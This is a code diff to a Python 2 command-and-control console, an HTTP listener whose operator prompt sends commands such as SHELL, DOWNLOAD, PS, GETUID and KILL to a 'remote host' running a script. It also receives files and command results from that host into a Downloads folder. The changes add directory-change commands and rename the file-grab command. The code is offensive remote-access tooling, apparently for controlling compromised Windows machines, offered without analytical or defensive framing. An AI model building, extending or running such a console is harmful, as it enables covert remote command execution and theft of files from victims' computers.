@@ -66,7 +66,6 @@ class myHandler(BaseHTTPRequestHandler):
         global context
 
         # File upload
-        # if ctype == 'multipart/form-data':
         form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
         cmd_data = form['cmd'].file.read()
         result_filename = form['result'].filename
@@ -80,11 +79,11 @@ class myHandler(BaseHTTPRequestHandler):
         # Store file
         if self.path == '/upload':
             # Create folder if required
-            if not os.path.exists('download'):
-                os.mkdir('download')
+            if not os.path.exists('Downloads'):
+                os.mkdir('Downloads')
 
             # Write file to disk
-            with file(os.path.join('download', result_filename), 'wb') as f:
+            with file(os.path.join('Downloads', result_filename), 'wb') as f:
                 f.write(result_data)
 
             print 'File \'%s\' downloaded.' % result_filename
@@ -131,9 +130,11 @@ def main():
     while True:
         s = raw_input('%s> ' % context)
         s = s.strip()
+        splitcmd = s.split(' ', 1)
+        cmd = splitcmd[0].upper()
 
         # In a context
-        if context == 'SHELL':
+        if context == 'SHELL' and cmd != 'CD':
             cmd = context
 
             if s.upper() == 'EXIT':
@@ -147,8 +148,6 @@ def main():
                     continue
         # No context
         else:
-            splitcmd = s.split(' ', 1)
-            cmd = splitcmd[0].upper()
             args = ''
             if len(splitcmd) > 1:
                 args = splitcmd[1]
@@ -158,7 +157,7 @@ def main():
                 continue
 
             # UPLOAD
-            if cmd == 'UPLOAD':
+            elif cmd == 'UPLOAD':
                 args = args.strip("\"")
 
                 # Check file existence
@@ -191,7 +190,7 @@ def main():
                 continue
 
             # SHELL
-            elif cmd == 'SHELL':
+            elif cmd == 'SHELL' and not args:
                 context = 'SHELL'
                 continue
 
@@ -207,12 +206,15 @@ def main():
             # HELP
             elif cmd == 'HELP':
                 print 'Supported commands:\n' \
-                      '- GET [path]         - Download the file at [path] to the .\\downloads folder.\n' \
+                      '- CD [directory]     - Change directory. Shows current directory when without parameter.\n' \
+                      '- DOWNLOAD [path]    - Download the file at [path] to the .\\Downloads folder.\n' \
                       '- GETUID             - Get shell user id.\n' \
+                      '- GETWD              - Get working directory. Same as CD.\n' \
                       '- HELP               - Show this help.\n' \
                       '- IFCONFIG           - Show network configuration.\n' \
                       '- KILL               - Stop script on the remote host.\n' \
                       '- PS                 - Show process list.\n' \
+                      '- PWD                - Same as GETWD and CD.\n' \
                       '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.\n' \
                       '                       When entered without parameters, it shows the currently set variables.\n' \
                       '- SHELL [command]    - Execute command in cmd.exe interpreter;\n' \
